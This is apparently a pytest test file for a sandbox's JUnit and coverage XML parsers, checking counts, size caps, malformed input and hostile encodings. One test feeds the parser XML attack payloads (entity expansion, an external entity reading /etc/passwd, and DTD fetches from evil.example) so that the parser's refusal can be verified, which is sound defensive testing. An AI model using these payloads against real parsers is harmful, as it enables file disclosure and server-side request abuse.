"""JUnit and coverage parsing of untrusted run artefacts (TEST_STRATEGY AC-08)."""

from __future__ import annotations

import pytest

from app.sandbox.coverage import parse_coverage
from app.sandbox.junit import MAX_CASES, JUnitError, parse_junit
from app.sandbox.safexml import MAX_XML_BYTES

PYTEST = b"""<?xml version="1.0" encoding="utf-8"?>
<testsuites name="pytest tests"><testsuite name="pytest" errors="0" failures="1" skipped="1" tests="4">
<testcase classname="tests.test_a" name="test_ok" time="0.001"/>
<testcase classname="tests.test_a" name="test_bad" time="0.001">
<failure message="assert 1 == 2">trace</failure></testcase>
<testcase classname="tests.test_a" name="test_skip"><skipped message="not now"/></testcase>
<testcase classname="tests.test_b" name="test_boom"><error message="fixture failed"/></testcase>
</testsuite></testsuites>"""


def test_counts_come_from_cases() -> None:
    summary = parse_junit(PYTEST)
    assert (summary.tests, summary.failures, summary.errors, summary.skipped, summary.passed) == (
        4,
        1,
        1,
        1,
        1,
    )
    bad = next(c for c in summary.cases if c.name == "test_bad")
    assert (bad.classname, bad.status, bad.message) == ("tests.test_a", "failed", "assert 1 == 2")


def test_summary_attributes_are_not_trusted() -> None:
    lying = b'<testsuite tests="100" failures="0"><testcase name="a"><failure/></testcase></testsuite>'
    summary = parse_junit(lying)
    assert (summary.tests, summary.failures) == (1, 1)


def test_nested_suites_from_node() -> None:
    node = (
        b'<testsuites><testsuite name="file"><testsuite name="group">'
        b'<testcase name="one"/><testcase name="two"/></testsuite></testsuite></testsuites>'
    )
    assert parse_junit(node).tests == 2


def test_empty_report() -> None:
    assert parse_junit(b"<testsuites/>").tests == 0


def test_cases_are_capped_but_counted() -> None:
    many = b"<testsuite>" + b'<testcase name="t"/>' * (MAX_CASES + 5) + b"</testsuite>"
    summary = parse_junit(many)
    assert summary.tests == MAX_CASES + 5
    assert len(summary.cases) == MAX_CASES


@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"<testsuite>",
        b"not xml",
        b"<html><body/></html>",
        b"<testsuite></testsuites>",
    ],
)
def test_malformed(data: bytes) -> None:
    with pytest.raises(JUnitError):
        parse_junit(data)


@pytest.mark.parametrize(
    "data",
    [
        b'<!DOCTYPE t [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><testsuite name="&b;"/>',
        b'<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/passwd">]><testsuite name="&x;"/>',
        b'<?xml version="1.0"?><!DOCTYPE testsuite SYSTEM "http://evil.example/t.dtd"><testsuite/>',
        b'<!DOCTYPE t [<!ENTITY % p SYSTEM "http://evil.example/p">%p;]><testsuite/>',
    ],
)
def test_dtd_and_entities_refused(data: bytes) -> None:
    with pytest.raises(JUnitError):
        parse_junit(data)


def test_size_limit() -> None:
    padding = b"<!--" + b"x" * MAX_XML_BYTES + b"-->"
    with pytest.raises(JUnitError):
        parse_junit(b"<testsuite>" + padding + b"</testsuite>")


def test_message_is_bounded() -> None:
    data = b'<testsuite><testcase name="a"><failure message="' + b"m" * 5000 + b'"/></testcase></testsuite>'
    assert len(parse_junit(data).cases[0].message) == 2000


@pytest.mark.parametrize(
    ("data", "rate"),
    [
        (b'<coverage line-rate="0.8512" branch-rate="0"/>', 0.8512),
        (b'<coverage line-rate="1"/>', 1.0),
        (b'<coverage line-rate="0"/>', 0.0),
        (b'<coverage line-rate="1.5"/>', None),
        (b'<coverage line-rate="-0.1"/>', None),
        (b'<coverage line-rate="nan"/>', None),
        (b'<coverage line-rate="abc"/>', None),
        (b"<coverage/>", None),
        (b'<report line-rate="0.5"/>', None),
        (b"broken", None),
        (b'<!DOCTYPE c [<!ENTITY r "0.9">]><coverage line-rate="&r;"/>', None),
    ],
)
def test_parse_coverage(data: bytes, rate: float | None) -> None:
    assert parse_coverage(data) == rate


def test_worst_outcome_of_a_case_counts() -> None:
    """pytest writes <skipped/> then <error/> when a skipped test's teardown fails (silent-failure F10)."""
    data = (
        b'<testsuite tests="1" errors="1">'
        b'<testcase name="t"><skipped/><error message="teardown"/></testcase></testsuite>'
    )
    summary = parse_junit(data)
    assert (summary.tests, summary.errors, summary.skipped) == (1, 1, 0)
    assert summary.cases[0].message == "teardown" and summary.inconsistent is False


def test_suite_level_errors_count() -> None:
    data = (
        b'<testsuites><testsuite name="collect" errors="1">'
        b'<error message="ImportError"/></testsuite></testsuites>'
    )
    summary = parse_junit(data)
    assert (summary.tests, summary.errors) == (1, 1)
    assert summary.cases[0].status == "error"


def test_claims_beyond_the_cases_are_flagged() -> None:
    lying = b'<testsuite tests="500" failures="0"><testcase name="a"/><testcase name="b"/></testsuite>'
    assert parse_junit(lying).inconsistent is True
    honest = (
        b'<testsuite tests="2" failures="1">'
        b'<testcase name="a"/><testcase name="b"><failure/></testcase></testsuite>'
    )
    assert parse_junit(honest).inconsistent is False
    bare = b'<testsuite><testcase name="a"/></testsuite>'
    assert parse_junit(bare).inconsistent is False  # no summary attributes, nothing claimed


def test_failing_cases_survive_truncation() -> None:
    cases = [b'<testcase name="p%d"/>' % i for i in range(2000)]
    cases[1500] = b'<testcase name="the-failure"><failure message="boom"/></testcase>'
    summary = parse_junit(b"<testsuite>" + b"".join(cases) + b"</testsuite>")
    assert summary.cases_truncated is True and len(summary.cases) == MAX_CASES
    assert summary.cases[0].name == "the-failure"


@pytest.mark.parametrize("encoding", [b"shift_jis", b"euc-jp", b"x-bogus"])
def test_hostile_encoding_declarations(encoding: bytes) -> None:
    data = b'<?xml version="1.0" encoding="' + encoding + b'"?><testsuite/>'
    with pytest.raises(JUnitError):
        parse_junit(data)
    assert (
        parse_coverage(b'<?xml version="1.0" encoding="' + encoding + b'"?><coverage line-rate="1"/>') is None
    )


def test_coverage_of_nothing_is_not_full_coverage() -> None:
    assert parse_coverage(b'<coverage line-rate="1" lines-valid="0" lines-covered="0"/>') is None
    assert parse_coverage(b'<coverage line-rate="0.5" lines-valid="10" lines-covered="5"/>') == 0.5
